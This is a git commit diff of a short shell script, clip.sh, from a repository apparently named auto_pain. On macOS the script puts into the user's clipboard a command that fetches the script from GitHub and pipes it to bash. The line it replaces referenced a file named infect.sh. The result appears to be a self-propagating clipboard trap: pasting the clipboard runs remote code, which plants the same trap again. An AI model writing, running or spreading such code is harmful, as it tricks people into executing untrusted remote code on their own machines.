fcf5a5915307cee3ed665cf7195e66b65e4e6d46
c8p2d01 <cdahlhof@42wolfsbug.de>
2024-07-20 23:17:40 +0200

    fixing test

--- clip.sh
+++ clip.sh
@@ -2,6 +2,7 @@
 
 OS=$(uname -s)
 
-if [ "$OS" == "Darwin" ] then
-	echo curl https://raw.githubusercontent.com/c8p2d01/auto_pain/main/infect.sh | pbcopy #MAC
+if [ "$OS" == "Darwin" ]
+then
+  echo "curl https://raw.githubusercontent.com/c8p2d01/auto_pain/main/clip.sh | bash" | pbcopy
 fi
